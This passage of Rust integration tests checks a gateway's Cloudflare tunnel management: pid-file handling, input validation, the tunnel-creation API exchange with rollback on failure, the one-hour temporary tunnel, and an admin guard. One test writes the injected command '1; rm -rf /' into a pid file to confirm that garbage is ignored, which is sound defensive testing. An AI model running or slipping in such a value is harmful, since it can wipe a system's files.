    assert!(alive(other.id()), "another program is never stopped");
    assert!(!t.dir().join("pid").exists());

    // Garbage: ignored.
    std::fs::write(t.dir().join("pid"), "1; rm -rf /").unwrap();
    let _t3 = t.restarted().await;

    // Ours: stopped.
    std::fs::write(t.dir().join("pid"), ours.id().to_string()).unwrap();
    let _t4 = t.restarted().await;
    let st = tokio::time::timeout(Duration::from_secs(5), async {
        loop {
            if let Some(s) = ours.try_wait().unwrap() {
                return s;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .expect("our stale child was stopped");
    assert!(!st.success());
    assert!(alive(other.id()));
    let _ = other.kill();
    let _ = other.wait();
}

// ---------------------------------------------------------------------------
// Register: inputs
// ---------------------------------------------------------------------------

#[tokio::test]
async fn register_and_create_refuse_bad_input() {
    let t = setup().await;
    for body in [
        json!({"token": "nonsense", "hostname": HOST}),
        json!({"token": tunnel_token(1), "hostname": "10.0.0.10"}),
        json!({"token": tunnel_token(1), "hostname": "x.trycloudflare.com"}),
        json!({"token": tunnel_token(1), "hostname": "music.example.com/admin"}),
        json!({"token": tunnel_token(1), "hostname": "music.example.com:8443"}),
        json!({"token": tunnel_token(1)}),
        json!({"token": tunnel_token(1), "hostname": HOST, "extra": 1}),
        json!(["x"]),
    ] {
        let (s, e) = t.post("/register", Some(body.clone())).await;
        assert_eq!(s, S::BAD_REQUEST, "{body}");
        assert!(e["error"].as_str().unwrap().ends_with('.'), "{e}");
        // The error never echoes the token.
        assert!(!e.to_string().contains(&tunnel_token(1)[..20]));
    }
    let (s, _) = t.post("/register", None).await;
    assert_eq!(s, S::BAD_REQUEST, "no body");
    for body in [
        json!({"api_token": "short", "hostname": HOST}),
        json!({"api_token": format!("{API_TOKEN} x"), "hostname": HOST}),
        json!({"api_token": API_TOKEN, "hostname": "cfargotunnel.com"}),
        json!({"api_token": API_TOKEN, "hostname": HOST, "replace_dns": "yes"}),
    ] {
        let (s, e) = t.post("/create", Some(body.clone())).await;
        assert_eq!(s, S::BAD_REQUEST, "{body}");
        assert!(!e.to_string().contains(API_TOKEN));
    }
    assert!(t.files().is_empty() || !t.dir().join("token").exists());
    assert!(t.cf.requests.lock().unwrap().is_empty());
    // Start with nothing registered.
    let (s, e) = t.post("/start", None).await;
    assert_eq!(s, S::CONFLICT);
    assert!(
        e["error"]
            .as_str()
            .unwrap()
            .contains("No tunnel is registered")
    );
}

// ---------------------------------------------------------------------------
// The create exchange
// ---------------------------------------------------------------------------

#[tokio::test]
async fn the_create_exchange_stores_only_the_tunnel_token_and_hostname() {
    let t = setup().await;
    // Not installed yet: create installs first.
    let (s, v) = t
        .post(
            "/create",
            Some(json!({"api_token": API_TOKEN, "hostname": HOST})),
        )
        .await;
    assert_eq!(s, S::ACCEPTED, "{v}");
    let v = t.wait_state("connected").await;
    assert_eq!(v["hostname"], HOST);
    assert_eq!(v["mode"], "registered");
    assert_eq!(
        t.cf.methods(),
        [
            "GET /zones".to_string(),
            "GET /zones".into(),
            format!("POST /accounts/{ACCOUNT}/cfd_tunnel"),
            format!("PUT /accounts/{ACCOUNT}/cfd_tunnel/{TUNNEL_ID}/configurations"),
            format!("GET /zones/{ZONE}/dns_records"),
            format!("POST /zones/{ZONE}/dns_records"),
            format!("GET /accounts/{ACCOUNT}/cfd_tunnel/{TUNNEL_ID}/token"),
        ]
    );
    let reqs = t.cf.requests.lock().unwrap().clone();
    for (_, _, auth, _) in &reqs {
        assert_eq!(auth, &format!("Bearer {API_TOKEN}"));
    }
    let create = &reqs[2].3;
    assert_eq!(create["name"], "lyrion-anywhere-music-example-com");
    assert_eq!(create["config_src"], "cloudflare");
    let secret = base64::engine::general_purpose::STANDARD
        .decode(create["tunnel_secret"].as_str().unwrap())
        .unwrap();
    assert_eq!(secret.len(), 32);
    assert_eq!(
        reqs[3].3,
        json!({"config": {"ingress": [
            {"hostname": HOST, "service": "http://127.0.0.1:9443"},
            {"service": "http_status:404"},
        ]}})
    );
    assert_eq!(reqs[4].1, format!("/zones/{ZONE}/dns_records?name={HOST}"));
    assert_eq!(
        reqs[5].3,
        json!({"type": "CNAME", "name": HOST, "content": format!("{TUNNEL_ID}.cfargotunnel.com"), "proxied": true})
    );
    assert!(!t.cf.deleted());
    // On disk: the token Cloudflare gave, the hostname, and never the API token.
    assert_eq!(
        std::fs::read_to_string(t.dir().join("token")).unwrap(),
        tunnel_token(9)
    );
    let state: Value =
        serde_json::from_slice(&std::fs::read(t.dir().join("state.json")).unwrap()).unwrap();
    assert_eq!(state["hostname"], HOST);
    let files = t.files();
    let mut names: Vec<&String> = files.keys().collect();
    names.sort();
    assert_eq!(names, ["cloudflared", "pid", "state.json", "token"]);
    for (name, contents) in walk(&t.data.0) {
        assert!(
            !String::from_utf8_lossy(&contents).contains(API_TOKEN),
            "the API token is in {name}"
        );
    }
    // The child runs with the new token.
    let (_, _, env) = runs(&t.rec).pop().unwrap();
    assert!(env.contains(&format!("TUNNEL_TOKEN={}", tunnel_token(9))));
    assert!(!t.status().await.to_string().contains(API_TOKEN));
}

/// Every file under `dir`, recursively, with its contents (the accounts database included).
fn walk(dir: &Path) -> Vec<(String, Vec<u8>)> {
    let mut out = vec![];
    for e in std::fs::read_dir(dir).unwrap().flatten() {
        let p = e.path();
        if p.is_dir() {
            out.extend(walk(&p));
        } else {
            out.push((
                p.display().to_string(),
                std::fs::read(&p).unwrap_or_default(),
            ));
        }
    }
    out
}

#[tokio::test]
async fn each_failing_step_is_named_and_a_half_made_tunnel_deleted() {
    for (step, deleted) in [
        ("zone", false),
        ("create", false),
        ("configure", true),
        ("dns", true),
        ("token", true),
    ] {
        let t = setup().await;
        t.install().await;
        *t.cf.fail_at.lock().unwrap() = Some(step);
        let (s, _) = t
            .post(
                "/create",
                Some(json!({"api_token": API_TOKEN, "hostname": HOST, "replace_dns": false})),
            )
            .await;
        assert_eq!(s, S::ACCEPTED);
        let v = t.wait_state("failed").await;
        let e = v["error"].as_str().unwrap();
        assert!(e.contains(&format!("\"{step}\" step")), "{step}: {e}");
        assert!(
            e.contains(&format!("Fake failure at {step}")),
            "{step}: {e}"
        );
        assert_eq!(t.cf.deleted(), deleted, "{step}: {:?}", t.cf.methods());
        assert!(!t.dir().join("token").exists());
        assert!(runs(&t.rec).is_empty());
        assert_eq!(v["step"], Value::Null);
    }
}

#[tokio::test]
async fn a_bad_tunnel_token_from_cloudflare_is_refused_and_the_tunnel_deleted() {
    let t = setup().await;
    t.install().await;
    *t.cf.token.lock().unwrap() = "not-a-token".into();
    t.post(
        "/create",
        Some(json!({"api_token": API_TOKEN, "hostname": HOST})),
    )
    .await;
    let v = t.wait_state("failed").await;
    assert!(
        v["error"].as_str().unwrap().contains("\"token\" step"),
        "{v}"
    );
    assert!(t.cf.deleted());
}

#[tokio::test]
async fn a_missing_permission_or_zone_is_named() {
    let t = setup().await;
    t.install().await;
    t.cf.missing_scope.store(true, Ordering::SeqCst);
    t.post(
        "/create",
        Some(json!({"api_token": API_TOKEN, "hostname": HOST})),
    )
    .await;
    let v = t.wait_state("failed").await;
    let e = v["error"].as_str().unwrap();
    assert!(e.contains("\"create\" step"), "{e}");
    assert!(e.contains("Authentication error"), "{e}");
    assert!(
        e.contains("the API token is missing a permission; it needs Account › Cloudflare Tunnel › Edit, Zone › DNS › Edit and Zone › Zone › Read"),
        "{e}"
    );

    let t = setup().await;
    t.install().await;
    t.cf.no_zone.store(true, Ordering::SeqCst);
    t.post(
        "/create",
        Some(json!({"api_token": API_TOKEN, "hostname": HOST})),
    )
    .await;
    let v = t.wait_state("failed").await;
    assert_eq!(
        v["error"],
        "no zone on this account contains music.example.com (the API token needs Zone › Zone › Read)"
    );
    assert!(!t.cf.deleted(), "nothing was created");
}

#[tokio::test]
async fn an_existing_dns_record_is_reported_unless_replace_is_ticked() {
    let t = setup().await;
    t.install().await;
    t.cf.existing_record.store(true, Ordering::SeqCst);
    t.post(
        "/create",
        Some(json!({"api_token": API_TOKEN, "hostname": HOST, "replace_dns": false})),
    )
    .await;
    let v = t.wait_state("failed").await;
    assert_eq!(
        v["error"],
        "a DNS record for music.example.com already exists; tick Replace to overwrite it"
    );
    assert!(t.cf.deleted());
    assert!(
        !t.cf
            .methods()
            .iter()
            .any(|m| m.starts_with("PATCH") || m == &format!("POST /zones/{ZONE}/dns_records"))
    );

    let t = setup().await;
    t.install().await;
    t.cf.existing_record.store(true, Ordering::SeqCst);
    t.post(
        "/create",
        Some(json!({"api_token": API_TOKEN, "hostname": HOST, "replace_dns": true})),
    )
    .await;
    t.wait_state("connected").await;
    let reqs = t.cf.requests.lock().unwrap().clone();
    let patch = reqs
        .iter()
        .find(|r| r.0 == "PATCH")
        .expect("the record was replaced");
    assert_eq!(patch.1, format!("/zones/{ZONE}/dns_records/{RECORD}"));
    assert_eq!(patch.3["type"], "CNAME");
    assert_eq!(patch.3["content"], format!("{TUNNEL_ID}.cfargotunnel.com"));
    assert_eq!(patch.3["proxied"], true);
    assert!(!t.cf.deleted());
}

// ---------------------------------------------------------------------------
// The temporary tunnel
// ---------------------------------------------------------------------------

#[tokio::test]
async fn the_temporary_tunnel_shows_its_address_and_stops_after_an_hour() {
    let t = setup().await;
    // Not installed: quick installs first.
    let (s, v) = t.post("/quick", None).await;
    assert_eq!(s, S::ACCEPTED);
    assert_eq!(v, json!({}));
    let v = t
        .wait("the address is known", |v| {
            v["hostname"] == QUICK && v["state"] == "connected"
        })
        .await;
    assert_eq!(v["mode"], "quick");
    assert_eq!(v["public_url"], format!("https://{QUICK}"));
    let left = v["quick_ends_in"].as_u64().unwrap();
    assert!((3590..=3600).contains(&left), "{left}");
    let (_, argv, env) = runs(&t.rec).pop().unwrap();
    assert_eq!(argv[..3], ["tunnel", "--no-autoupdate", "--metrics"]);
    assert_eq!(
        argv[4..],
        ["--loglevel", "info", "--url", "http://127.0.0.1:9443"]
    );
    assert!(env.iter().all(|e| !e.starts_with("TUNNEL_TOKEN=")));
    assert!(
        t.h.gw
            .tunnel()
            .overrides()
            .origin_allowed(&format!("https://{QUICK}"))
    );
    // A registered tunnel can't start meanwhile... through quick's route it's refused the
    // other way round; starting quick again is a no-op.
    assert_eq!(t.post("/quick", None).await.0, S::ACCEPTED);
    assert_eq!(runs(&t.rec).len(), 1);
    // Nothing about it on disk.
    let files = t.files();
    let mut names: Vec<&String> = files.keys().collect();
    names.sort();
    assert_eq!(names, ["cloudflared", "pid", "state.json"]);
    for (name, contents) in &files {
        assert!(
            !String::from_utf8_lossy(contents).contains("trycloudflare"),
            "{name}"
        );
    }
    // The hour passes.
    t.clock.advance(Duration::from_secs(30 * 60));
    let v = t.status().await;
    assert!(v["quick_ends_in"].as_u64().unwrap() <= 1800);
    t.clock.advance(Duration::from_secs(31 * 60));
    let v = t.wait_state("installed").await;
    assert_eq!(v["mode"], "none");
    assert_eq!(v["public_url"], Value::Null);
    assert_eq!(v["quick_ends_in"], Value::Null);
    assert!(v["log"].to_string().contains("stopped after one hour"));
    assert!(t.live_runs().is_empty());
    assert!(!t.h.gw.tunnel().overrides().active());
    let mut names: Vec<String> = t.files().into_keys().collect();
    names.sort();
    assert_eq!(names, ["cloudflared", "state.json"]);
    // It never restarts with the gateway.
    let t2 = t.restarted().await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(t2.status()["state"], "installed");
    assert!(t.live_runs().is_empty());
}

#[tokio::test]
async fn the_temporary_address_is_read_from_the_output_when_the_endpoint_has_none() {
    let t = setup().await;
    t.install().await;
    t.metrics.quick.store(false, Ordering::SeqCst);
    std::fs::write(
        t.rec.join("quick-line"),
        format!("INF |  https://{QUICK}                                   |\n"),
    )
    .unwrap();
    t.post("/quick", None).await;
    let v = t
        .wait("address from the output", |v| v["hostname"] == QUICK)
        .await;
    assert_eq!(v["public_url"], format!("https://{QUICK}"));
}

#[tokio::test]
async fn a_registered_tunnel_starting_stops_the_temporary_one() {
    let t = setup().await;
    t.install().await;
    t.post("/quick", None).await;
    t.wait("quick running", |v| v["hostname"] == QUICK).await;
    let quick_pid = t.live_runs()[0];
    t.register().await;
    let v = t.wait_state("connected").await;
    assert_eq!(v["mode"], "registered");
    assert!(!alive(quick_pid));
    assert_eq!(t.live_runs().len(), 1);
    assert!(
        t.h.gw
            .tunnel()
            .overrides()
            .origin_allowed(&format!("https://{HOST}"))
    );
    assert!(
        !t.h.gw
            .tunnel()
            .overrides()
            .origin_allowed(&format!("https://{QUICK}"))
    );
    // And quick is refused while it runs.
    let (s, e) = t.post("/quick", None).await;
    assert_eq!(s, S::CONFLICT);
    assert!(e["error"].as_str().unwrap().contains("stop it"));
    // Stopping, then start: quick stopped by start too.
    t.post("/stop", None).await;
    t.post("/quick", None).await;
    t.wait("quick again", |v| {
        v["mode"] == "quick" && v["hostname"] == QUICK
    })
    .await;
    let quick_pid = t.live_runs()[0];
    assert_eq!(t.post("/start", None).await.0, S::NO_CONTENT);
    t.wait("registered again", |v| {
        v["mode"] == "registered" && v["state"] == "connected"
    })
    .await;
    assert!(!alive(quick_pid));
}

// ---------------------------------------------------------------------------
// The gateway's settings follow the tunnel
// ---------------------------------------------------------------------------

async fn login(t: &T, headers: &[(&str, &str)]) -> reqwest::Response {
    let mut req = reqwest::Client::new()
        .post(t.h.url("/v1/auth/login"))
        .json(&json!({"username": "alice", "password": PW, "device_name": "Phone"}));
    for (k, v) in headers {
        req = req.header(*k, *v);
    }
    req.send().await.unwrap()
}

async fn last_addr(t: &T, device: i64) -> Value {
    let v: Value = reqwest::Client::new()
        .get(format!("{}/admin/v1/devices", t.admin))
        .bearer_auth(&t.secret)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    v["devices"]
        .as_array()
        .unwrap()
        .iter()
        .find(|d| d["id"] == device)
        .unwrap()["last_addr"]
        .clone()
}

#[tokio::test]
async fn origin_and_client_address_follow_the_tunnel_and_revert() {
    let t = setup().await;
    let origin = format!("https://{HOST}");
    // As cloudflared sends them, from loopback.
    let via_tunnel = [
        ("x-anywhere-client", "1"),
        ("origin", origin.as_str()),
        ("x-forwarded-proto", "https"),
        ("x-forwarded-for", "198.51.100.200"),
        ("cf-connecting-ip", "198.51.100.7"),
    ];
    assert_eq!(login(&t, &via_tunnel).await.status(), S::FORBIDDEN);

    t.install().await;
    t.register().await;
    t.wait_state("connected").await;
    let r = login(&t, &via_tunnel).await;
    assert_eq!(r.status(), S::OK);
    let id = r.json::<Value>().await.unwrap()["device"]["id"]
        .as_i64()
        .unwrap();
    assert_eq!(last_addr(&t, id).await, "198.51.100.7");

    t.post("/stop", None).await;
    assert_eq!(
        login(&t, &via_tunnel).await.status(),
        S::FORBIDDEN,
        "origin reverted"
    );
    let r = login(
        &t,
        &[
            ("x-anywhere-client", "1"),
            ("x-forwarded-proto", "https"),
            ("x-forwarded-for", "198.51.100.200"),
            ("cf-connecting-ip", "198.51.100.7"),
        ],
    )
    .await;
    assert_eq!(r.status(), S::OK);
    let id = r.json::<Value>().await.unwrap()["device"]["id"]
        .as_i64()
        .unwrap();
    assert_eq!(
        last_addr(&t, id).await,
        "198.51.100.200",
        "CF-Connecting-IP no longer read"
    );
}

// ---------------------------------------------------------------------------
// The admin guard
// ---------------------------------------------------------------------------

#[tokio::test]
async fn every_tunnel_route_needs_the_admin_secret_and_loopback() {
    let t = setup().await;
    let mut all: Vec<(&str, &str, Option<Value>)> = vec![("GET", "", None), ("GET", "/log", None)];
    for (p, b) in routes() {
        all.push(("POST", p, b));
    }
    for (method, path, body) in &all {
        let url = format!("{}/admin/v1/tunnel{path}", t.admin);
        let c = reqwest::Client::new();
        let mk = || {
            let mut r = c.request(method.parse().unwrap(), &url);
            if let Some(b) = body {
                r = r.json(b);
            }
            r
        };
        assert_eq!(
            mk().send().await.unwrap().status(),
            S::FORBIDDEN,
            "{path} no secret"
        );
        assert_eq!(
            mk().bearer_auth("wrong").send().await.unwrap().status(),
            S::FORBIDDEN,
            "{path} wrong secret"
        );
        assert_eq!(
            mk().bearer_auth(&t.secret)
                .header("x-forwarded-for", "203.0.113.5")
                .send()
                .await
                .unwrap()
                .status(),
            S::FORBIDDEN,
            "{path} proxied"
        );
        // From a non-loopback peer, secret or not.
        let app = admin::router(t.h.gw.clone(), t.secret.clone());
        let mut req = axum::http::Request::builder()
            .method(*method)
            .uri(format!("/admin/v1/tunnel{path}"))
            .header("authorization", format!("Bearer {}", t.secret))
            .header("content-type", "application/json")
            .body(Body::from(
                body.as_ref().map(|b| b.to_string()).unwrap_or_default(),
            ))
            .unwrap();
        req.extensions_mut().insert(ConnectInfo(
            "203.0.113.5:5555".parse::<SocketAddr>().unwrap(),
        ));
        assert_eq!(
            app.oneshot(req).await.unwrap().status(),
            StatusCode::FORBIDDEN,
            "{path} remote"
        );
        // Not on the public listener at all.
        let r = c
            .request(
                method.parse().unwrap(),
                t.h.url(&format!("/admin/v1/tunnel{path}")),
            )
            .bearer_auth(&t.secret)
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), S::NOT_FOUND, "{path} public");
    }
    // Nothing happened.
    assert!(t.gh.requests.lock().unwrap().is_empty());
    assert!(t.cf.requests.lock().unwrap().is_empty());
    assert!(runs(&t.rec).is_empty());
}
